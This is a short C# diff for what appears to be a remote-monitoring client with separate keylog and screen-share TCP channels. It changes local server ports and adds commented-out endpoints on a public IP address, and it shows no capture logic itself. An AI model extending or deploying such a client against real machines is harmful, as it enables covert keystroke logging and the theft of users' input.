@@ -12,6 +12,7 @@ using System.IO;
 using System.Drawing.Imaging;
 using System.Runtime.InteropServices;
 using System.Runtime.Serialization.Formatters.Binary;
+using System.Diagnostics;
 
 namespace Client
 {
@@ -56,10 +57,23 @@ namespace Client
                 keylogClient = new TcpClient();
                 shareClient = new TcpClient();
 
-                IPServer = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 8000);
-                IPKeyServer = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 8001);
-                IPShare = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 8002);
-                
+                IPServer = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 9000);
+                IPKeyServer = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 9001);
+                IPShare = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 9002);
+
+                /*IPServer = new IPEndPoint(IPAddress.Parse("18.136.148.247"), 14232);
+                IPKeyServer = new IPEndPoint(IPAddress.Parse("18.136.148.247"), 15202);
+                IPShare = new IPEndPoint(IPAddress.Parse("18.136.148.247"), 12896);*/
+                /*
+                string servername = "";
+                var address = Dns.GetHostAddresses(servername);
+                Debug.Assert(address.Length != 0);
+                var endPoint = new IPEndPoint(address[0], 8080);
+
+                server = new TcpClient(endPoint);
+
+                */
+
 
 
                 client.Connect(IPServer);
